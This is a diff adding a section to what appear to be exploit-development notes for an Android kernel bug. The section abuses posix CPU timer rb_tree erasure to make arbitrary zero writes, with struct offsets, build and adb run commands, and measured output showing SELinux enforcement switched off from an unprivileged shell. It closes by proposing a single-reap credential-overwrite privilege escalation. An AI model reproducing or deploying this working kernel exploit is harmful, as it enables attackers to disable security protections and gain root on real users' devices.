@@ -184,3 +184,52 @@ single-threaded run (3500 rings) showed the same effect with 26 hits.
   rings`). The matcher must require `seen == rings` for a CPU before trusting
   it, and a real payload should spray fewer rings (hundreds) or raise
   `buffer_size_kb`.
+
+## D. One reap, three writes (three timerqueue bases)
+
+`posix_cputimers` holds three timerqueue bases (`CPUCLOCK_PROF`,
+`CPUCLOCK_VIRT`, `CPUCLOCK_SCHED`; rb_node at `TASK+0x870/0x888/0x8a0`,
+bases 0x18 apart). The exec thread can arm one timer per base with the
+per-thread clockid encoding `((~tid) << 3) | 4 | base`, so all three nodes
+live in the same 8 KiB slab page. When that page is reclaimed, the single
+`posix_cpu_timers_exit()` walk erases all three nodes and performs three
+independent `rb_erase` fast-path writes per reap instead of one.
+
+Each node is loaded with `pc=0, rb_right=0, rb_left=S`, so the erase writes
+zero to `S` (`O3P_D3=1`; experiment only, `O3P_NOKSU=1`):
+
+| tile | `S` | effect |
+|---|---|---|
+| PROF | `selinux_state-7` | 8-byte unaligned zero: `enforcing=0`; `initialized`/`policycap` untouched |
+| VIRT | `perf_page+0x10` | zeroes `q[2]`, which held the victim node pointer |
+| SCHED | `perf_page+0x18` | zeroes `q[3]`, pre-set to `0xdeadbeef` as a witness |
+
+Build and run:
+
+```
+$CC -std=gnu11 -O2 -pthread -I . -I ksu -o build/d3.bin payload/o3p.c
+adb push build/d3.bin /data/local/tmp/d3.bin
+adb shell 'cd /data/local/tmp; O3P_D3=1 O3P_NOKSU=1 ./d3.bin 10000 14000 300 1 4 1 8000 800'
+```
+
+Measured (boot `f545f2f7`, Enforcing, no KernelSU, adb shell uid 2000):
+
+```
+D3ADDR a0=0xffffff81bfadd800 a1=0xffffff81bfadd380 a2=0xffffff81bfadcc00 off0=0x1800 off1=0x1380 off2=0xc00
+HIT pages=14000
+SELWRITE target=0xffffffecd0b59629 want=0x0 val=0x0 SEL_OK state=0x100000101010100
+D3PAGE slot0=0x100000 slot1=0x0 slot2=0x0 slot3=0x0
+```
+
+`state=0x0100000101010100` proves the unaligned write cleared only byte 0
+(`enforcing`), leaving `initialized=1` and `policycap` untouched. `slot2`
+went from the timer object pointer to 0 and `slot3` from `0xdeadbeef` to 0,
+so the same reap performed the SELinux zero and two controlled zero writes
+(`slot0` is restored to `0x100000` by `repair_fake_cred()` after the reap).
+`getenforce` reports `Permissive` afterwards, without a reboot.
+
+**Limits:** all three nodes must fall in the same 8 KiB page (observed on
+every attempt here, not guaranteed); D3 is a shell-domain experiment and does
+not load KernelSU. Combined with the C harness (PFN-verified reclaim) this
+becomes a single-reap "cred + enforcing" primitive, with tile PROF retargeted
+to `&task->cred-8`.
